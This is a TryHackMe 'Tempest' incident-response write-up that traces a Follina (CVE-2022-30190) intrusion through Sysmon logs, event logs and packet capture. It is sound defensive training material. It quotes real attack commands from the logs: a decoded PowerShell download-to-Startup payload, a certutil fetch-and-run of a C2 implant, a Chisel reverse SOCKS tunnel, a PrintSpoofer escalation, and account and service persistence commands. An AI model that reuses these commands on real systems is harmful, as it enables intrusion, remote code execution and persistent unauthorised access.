<div align="center">

# 🌩️ Tempest

**TryHackMe - SOC Level 1 Capstone Challenge**

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Incident%20Response-blue)
![Completed](https://img.shields.io/badge/Completed-28th%20of%20September%202026-green)

[![Open Room on TryHackMe](https://img.shields.io/badge/Open%20Room-TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com/room/tempestincident)

</div>

<br>

<h2 align="center">📋 Summary</h2>

Tempest is an incident response room. A Windows workstation (`TEMPEST`) went through a full attack chain, and the job is to rebuild what happened using three artefacts: **Sysmon logs**, **Windows Event Logs** and a **packet capture**.

> **The short version:** user `benimaru` downloaded a malicious Word document, which abused the Follina vulnerability (CVE-2022-30190) to run PowerShell. That dropped a persistence file into the Startup folder, which pulled down a C2 implant. The attacker used it to look around the machine, found a password, tunnelled into WinRM with Chisel, escalated to SYSTEM with PrintSpoofer, created new admin accounts and installed a service for persistent access.

**Attack chain at a glance:**

```
Malicious .doc → Follina (msdt.exe) → Startup persistence → first.exe (C2)
→ Recon → Chisel + WinRM → PrintSpoofer → final.exe as SYSTEM → New admins + service
```

**Tools used:** EvtxECmd · Timeline Explorer · Brim · CyberChef · VirusTotal · PowerShell

<br>

## 🗂️ Contents

- [Task 3 - Preparation](#task-3---preparation-tools-and-artifacts)
- [Task 4 - Malicious Document](#task-4---initial-access-malicious-document)
- [Task 5 - Stage 2 Execution](#task-5---initial-access-stage-2-execution)
- [Task 6 - Malicious Document Traffic](#task-6---initial-access-malicious-document-traffic)
- [Task 7 - Internal Reconnaissance](#task-7---discovery-internal-reconnaissance)
- [Task 8 - Privilege Escalation](#task-8---privilege-escalation-exploiting-privileges)
- [Task 9 - Fully-Owned Machine](#task-9---actions-on-objective-fully-owned-machine)
- [Attack Timeline](#attack-timeline)
- [Lessons Learned](#lessons-learned)

<br>

<br>

---

## Task 3 - Preparation: Tools and Artifacts

Before touching the evidence, it's good practice to check the files' hashes, so you know you're working on exactly what was collected.

### Q1. What is the SHA256 hash of the capture.pcapng file?

I opened PowerShell on the lab machine and ran:

```powershell
cd '.\Desktop\Incident Files\'
ls
Get-FileHash -Algorithm SHA256 .\capture.pcapng
```

Small side note: my first attempt went wrong because I tried to chain commands on one line incorrectly. A semicolon splits separate commands, so it only works between whole commands, not in the middle of one.

**✅ Answer:**
```
CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
```

<br>

---

### Q2. What is the SHA256 hash of the sysmon.evtx file?

Same command, just pointing at `sysmon.evtx`.

**✅ Answer:**
```
665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F
```

<br>

---

### Q3. What is the SHA256 hash of the windows.evtx file?

Same again, with `windows.evtx`.

**✅ Answer:**
```
D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60
```

<br>

---

## Task 4 - Initial Access: Malicious Document

The SOC analyst's notes said the intrusion started with a `.doc` file downloaded through `chrome.exe`, which then ran a chain of commands.

### Q1. The user of this machine was compromised by a malicious document. What is the file name of the document?

First I converted the Sysmon log into CSV so Timeline Explorer could read it:

```powershell
.\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
```

This also took a couple of tries. I first got errors because of a misplaced semicolon and missing quotes around paths with spaces in them ("Incident Files").

Then I loaded `sysmon.csv` into Timeline Explorer and searched for `.doc`. The same file name was highlighted in the `Payload Data4` column in every result, and to confirm, it was opened by `WINWORD.EXE`.

**✅ Answer:**
```
free_magicules.doc
```

<br>

---

### Q2. What is the name of the compromised user and machine?

> 📝 Format: username-machine name

Scrolling all the way left in the same records, the `User Name` column shows `TEMPEST\benimaru` - so the user is `benimaru` and the machine is `TEMPEST`. I just had to flip it into the required format.

**✅ Answer:**
```
benimaru-TEMPEST
```

<br>

---

### Q3. What is the PID of the Microsoft Word process that opened the malicious document?

The `Payload Data1` column of the Word record shows `ProcessID: 496, ProcessGUID: 4bbef3ae-aaa8-62b0-2e0a-000000000700`.

**✅ Answer:**
```
496
```

<br>

---

### Q4. Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?

I searched for `496` to narrow things down to Word's activity, then filtered the `Map Description` column to DNS events (Sysmon Event ID 22). In the full payload of that event I found the domain `phishteam.xyz` and the IP it resolved to.

**✅ Answer:**
```
167.71.199.191
```

<br>

---

### Q5. What is the base64 encoded string in the malicious payload executed by the document?

I quickly googled how base64 usually shows up in PowerShell commands, and the common pattern is `FromBase64String(`. Searching for that in Timeline Explorer gave exactly one record. I opened it and copied the string from inside the command line.

**✅ Answer:**
```
JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
```

Decoded, it looks like this:

```powershell
$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
```

In plain words: go to the user's Startup folder, download `update.zip` from the attacker's server, unpack it there and delete the zip. That becomes important in the next task.

### Q6. What is the CVE number of the exploit used by the attacker to achieve a remote code execution?

> 📝 Format: XXXX-XXXXX

The record from Q5 had an MD5 hash, so I checked it in VirusTotal - it came back as Microsoft's `msdt.exe`. In the same record I spotted a strange command line:

```
C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression(...
```

I pasted that into Google and it came straight back as **Follina**.

Follina in short: a Word document can load an HTML page from a remote server. That page uses the `ms-msdt:` link to open the Microsoft Support Diagnostic Tool (MSDT), and the parameters passed to MSDT can smuggle in PowerShell that gets executed. No macros needed - just opening (or even previewing) the file is enough. The telltale sign in logs is Word spawning `msdt.exe`, exactly like here.

**✅ Answer:**
```
2022-30190
```

<br>

---

## Task 5 - Initial Access: Stage 2 Execution

### Q1. The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?

I combined two things: the room's hint that something happens in autostart, and the decoded payload from the previous task.

1. `$app=[Environment]::GetFolderPath('ApplicationData')` points to the current user's `AppData\Roaming` folder.
2. `cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"` - that's where the file lands.
3. The record showed `User: TEMPEST\benimaru` and `CurrentDirectory: C:\Users\benimaru\Downloads\`, so the user folder is `benimaru`.

Put together:

**✅ Answer:**
```
C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

<br>

---

### Q2. The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?

> 📝 Format: Remove the double quotes from the log.

I filtered to Event ID 1 (Process Creation) and searched for `phishteam.xyz`, since the startup file most likely talks to the attacker's server again. Two records lit up, both with the same `Payload Data6`, which held the full command. After removing the double quotes:

**✅ Answer:**
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

So on login, a hidden PowerShell window uses `certutil` (a built-in Windows tool) to download `first.exe` and then runs it.

### Q3. Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?

I searched for `first.exe` and focused on the record after the command from Q2, where `first.exe` was already sitting in `C:\Users\Public\Downloads` and being executed. The SHA256 was in the full payload, in one of the last columns.

**✅ Answer:**
```
CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
```

<br>

---

### Q4. The stage 2 payload downloaded establishes a connection to a C2 server. What is the domain and port used by the attacker?

> 📝 Format: domain:port

I struggled a bit here and had to do some digging. What worked in the end was filtering to Event ID 3 and searching for `first.exe`.

Sysmon Event ID 3 logs every network connection together with the process that made it. Since I already knew stage 2 was `first.exe`, filtering to only its connections showed where it was calling home - the destination hostname and port. The same address and port kept repeating over and over, which is typical of beaconing to a C2 server.

**✅ Answer:**
```
resolvecyber.xyz:80
```

<br>

---

## Task 6 - Initial Access: Malicious Document Traffic

Now the packet capture comes in. I switched to Brim.

One gotcha: my first queries returned "No Result Data" every time. Turned out I had loaded `sysmon.csv` into Brim instead of `capture.pcapng`. Fields like `_path=="http"` only exist in the Zeek logs Brim builds from a pcap, so I imported `capture.pcapng` and everything started working.

### Q1. What is the URL of the malicious payload embedded in the document?

The room suggests the filter `_path=="http" "<malicious domain>"`. I used `phishteam.xyz` and kept only the timestamp, host and URI columns, sorted by time:

```
_path=="http" "phishteam.xyz"
| cut ts, host, uri
| sort ts
```

The earliest request is the page the document fetched right after being opened - before `update.zip` and `first.exe`.

**✅ Answer:**
```
http://phishteam.xyz/02dcf07/index.html
```

<br>

---

### Q2. What is the encoding used by the attacker on the C2 connection?

Same query, but with the C2 domain `resolvecyber.xyz` instead. The URIs were full of long random-looking strings, all starting with `/9ab62b5?q=` and often ending with `==`. That trailing `==` padding is a classic sign of base64, and it decoded fine in CyberChef.

One mistake I made: I pasted the whole URI into CyberChef, including `/9ab62b5?q=`. Those characters are valid base64 too, so they got decoded along with the data and the output turned into garbage. Only the part after `q=` should go in.

**✅ Answer:**
```
base64
```

<br>

---

### Q3. The malicious C2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

Every request had `?q=` in it, and the value after `q=` decodes into readable command output - the results sent from the victim back to the attacker.

**✅ Answer:**
```
q
```

<br>

---

### Q4. The malicious C2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?

Looking at the same list of URIs, the implant keeps requesting the same path to ask for new commands.

**✅ Answer:**
```
/9ab62b5
```

<br>

---

### Q5. What is the HTTP method used by the binary?

**✅ Answer:**
```
GET
```

<br>

---

### Q6. Based on the user agent, what programming language was used by the attacker to compile the binary?

> 📝 Format: Answer in lowercase

I added the `user_agent` column to the query:

```
_path=="http" "resolvecyber.xyz"
| cut ts, host, uri, user_agent
| sort ts
```

Every result showed `Nim httpclient/1.6.6`, so the implant was written in Nim.

**✅ Answer:**
```
nim
```

<br>

---

## Task 7 - Discovery: Internal Reconnaissance

### Q1. The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?

I used the room's suggested filter:

```
_path=="http" "resolvecyber.xyz" id.resp_p==80
| cut uri
| sort ts
```

The plan was to decode every `q=` value, but copying text out of the VM was a nightmare - the clipboard kept pasting something else. So I found a workaround:

1. Exported the Brim results to a `.csv` file.
2. Opened it in WordPad on the VM.
3. Used Replace to strip out the `/9ab62b5?q=` prefixes.
4. Copied the cleaned strings into CyberChef and decoded them.
5. Did a quick Ctrl+F for `pass` in the output.

The output of the attacker reading a file on the machine contained the password.

**✅ Answer:**
```
infernotempest
```

<br>

---

### Q2. The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?

The decoded output had a list of listening ports. I googled the ones I didn't recognise, and 5985 is the default port for WinRM (Windows Remote Management) over HTTP - which gives a remote PowerShell shell.

**✅ Answer:**
```
5985
```

<br>

---

### Q3. The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?

> 📝 Format: Remove the double quotes from the log.

I remembered seeing something like this in Timeline Explorer earlier, so I searched for `socks` and got exactly one record. After removing the double quotes:

**✅ Answer:**
```
C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
```

`R:socks` means a reverse SOCKS proxy - the victim connects out to the attacker, and the attacker can then route traffic back through it into the machine's internal services (like WinRM on 5985).

### Q4. What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?

From Q3 I knew the file was `ch.exe`. The hashes were in the `Payload Data3` column of the same record.

**✅ Answer:**
```
8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
```

<br>

---

### Q5. What is the name of the tool used by the attacker based on the SHA256 hash?

> 📝 Format: Provide the answer in lowercase.

I pasted the hash into VirusTotal and it came back as `chisel.exe`. Chisel is an open source tunnelling tool, often used by attackers to reach services that aren't exposed to the internet.

**✅ Answer:**
```
chisel
```

<br>

---

### Q6. The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?

> 📝 Format: Answer in lowercase

The process that showed up right after Chisel was `wsmprovhost.exe`. That's the host process Windows starts whenever someone opens a remote PowerShell session over WinRM. It all ties together: the attacker tunnelled through Chisel to reach port 5985 (Q2) and logged in with the password found in Q1.

**✅ Answer:**
```
winrm
```

<br>

---

## Task 8 - Privilege Escalation: Exploiting Privileges

### Q1. After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?

> 📝 Format: binary name,SHA256 hash

I probably took a slightly harder route here, but I filtered Sysmon to Event ID 1 and sorted from newest to oldest. Luckily the binary was right on the first line - `spf.exe`.

For the hash I searched for `spf.exe` and found this command:

```
C:\Users\benimaru\Downloads\spf.exe -c C:\ProgramData\final.exe
```

So `spf.exe` was used to run `final.exe`. The process creation record for that command contained the hash of `spf.exe`.

**✅ Answer:**
```
spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
```

<br>

---

### Q2. Based on the SHA256 hash of the binary, what is the name of the tool used?

> 📝 Format: Answer in lowercase

VirusTotal > paste the hash > Details.

**✅ Answer:**
```
printspoofer
```

<br>

---

### Q3. The tool exploits a specific privilege owned by the user. What is the name of the privilege?

I googled what privilege PrintSpoofer abuses.

`SeImpersonatePrivilege` lets an account act as ("impersonate") another user after that user connects to it. It's normal for service accounts, which is why it's so often abused. PrintSpoofer tricks the Print Spooler service, which runs as SYSTEM, into connecting to a named pipe the attacker controls. The tool then grabs SYSTEM's token and uses it to start a new process as SYSTEM.

**✅ Answer:**
```
SeImpersonatePrivilege
```

<br>

---

### Q4. Then, the attacker executed the tool with another binary to establish a C2 connection. What is the name of the binary?

This was already visible in Q1. The `-c` flag tells PrintSpoofer which program to run with SYSTEM privileges - here `C:\ProgramData\final.exe`, a new C2 implant. The DNS logs back this up: `final.exe` queried `resolvecyber.xyz` while running as `NT AUTHORITY\SYSTEM`.

**✅ Answer:**
```
final.exe
```

<br>

---

### Q5. The binary connects to a different port from the first C2 connection. What is the port used?

In Timeline Explorer I filtered to network connections (Event ID 3) for `final.exe`, and the full payload showed the destination port.

**✅ Answer:**
```
8080
```

<br>

---

## Task 9 - Actions on Objective: Fully-Owned Machine

### Q1. Upon achieving SYSTEM access, the attacker then created two users. What are the account names?

> 📝 Format: Answer in alphabetical order - comma delimited

To refresh my memory I googled the command for creating users on Windows - it's `net user <name> <password> /add`. I searched for `/add` in Timeline Explorer and found two new accounts.

**✅ Answer:**
```
shion,shuna
```

<br>

---

### Q2. Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?

I removed `/add` from the search and looked at the other `net user` commands. The earlier attempts didn't have `/add` at all. Without it, `net user <name> <password>` tries to change the password of an existing account - and since those users didn't exist yet, it failed.

**✅ Answer:**
```
/add
```

<br>

---

### Q3. Based on Windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?

I remembered this one from previous rooms in the SOC module (googling would be just as fast).

**✅ Answer:**
```
4720
```

<br>

---

### Q4. The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?

This was also visible while searching for `/add`, in the `Executable Info` column.

**✅ Answer:**
```
net localgroup administrators /add shion
```

<br>

---

### Q5. Based on Windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?

I googled this one - 4732 is "a member was added to a security-enabled local group".

**✅ Answer:**
```
4732
```

<br>

---

### Q6. After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?

> 📝 Format: Remove the double quotes from the log.

I filtered to Event ID 1 and went through the `Executable Info` column by hand around the account creation events. One execution stood out: `sc.exe` with `TEMPEST` in the command line. After removing the double quotes:

**✅ Answer:**
```
C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
```

This creates a Windows service called `TempestUpdate2` that runs `final.exe` automatically at every boot. Services run as SYSTEM by default, so the attacker keeps full admin-level C2 access even after a restart.

<br>

---

## Attack Timeline

All events happened on the 20th of June 2022 on host `TEMPEST`.

| # | Stage | What happened | Evidence |
|---|-------|---------------|----------|
| 1 | Initial access | `benimaru` downloads `free_magicules.doc` with Chrome and opens it in Word (PID 496) | Sysmon Event ID 1, 11 |
| 2 | Execution | Word fetches `http://phishteam.xyz/02dcf07/index.html` (167.71.199.191), which triggers Follina (CVE-2022-30190) through `msdt.exe` | Sysmon Event ID 1, 22; pcap |
| 3 | Persistence | Base64 PowerShell downloads `update.zip` and unpacks it into the user's Startup folder | Sysmon Event ID 1, 11 |
| 4 | Stage 2 | On login, the startup payload uses `certutil` to download and run `first.exe` into `C:\Users\Public\Downloads` | Sysmon Event ID 1 |
| 5 | Command and control | `first.exe` (a Nim implant) beacons to `resolvecyber.xyz:80` - `GET /9ab62b5`, results sent back base64-encoded in `q=` | Sysmon Event ID 3; pcap |
| 6 | Discovery | Attacker enumerates groups, users and folders, finds password `infernotempest` in a file and sees WinRM listening on 5985 | pcap (decoded C2 traffic) |
| 7 | Lateral access | `ch.exe` (Chisel) opens a reverse SOCKS proxy to `167.71.199.191:8080`; attacker logs in over WinRM (`wsmprovhost.exe`) | Sysmon Event ID 1 |
| 8 | Privilege escalation | `spf.exe` (PrintSpoofer) abuses `SeImpersonatePrivilege` to run `final.exe` as SYSTEM | Sysmon Event ID 1 |
| 9 | Command and control | `final.exe` connects to `resolvecyber.xyz:8080` as `NT AUTHORITY\SYSTEM` | Sysmon Event ID 3, 22 |
| 10 | Persistence | Accounts `shion` and `shuna` created (after failed attempts without `/add`); `shion` added to Administrators | Sysmon Event ID 1; Windows Event ID 4720, 4732 |
| 11 | Persistence | Service `TempestUpdate2` created to launch `final.exe` automatically | Sysmon Event ID 1 |

---

<br>

<div align="center">

### And voilà, there you have it! 🎉

</div>

<br>

## Lessons Learned

- **Correlation is the whole game.** Sysmon told me *which process* did something, the pcap told me *what was sent*. Neither was enough on its own - the C2 commands only made sense after decoding the network traffic, and the network traffic only made sense once I knew which process made it.
- **Know your Sysmon Event IDs.** 1 (process creation), 3 (network connection), 11 (file creation) and 22 (DNS query) answered almost every question in this room.
- **Follow the parent-child chain.** Word spawning `msdt.exe` is a huge red flag, and walking down from there (msdt > PowerShell > certutil > first.exe) laid out the whole attack.
- **Base64 has a look.** Long strings of letters and digits, often ending with `=` or `==`, especially in URL parameters - worth throwing into CyberChef straight away. Just make sure you only paste the encoded part.
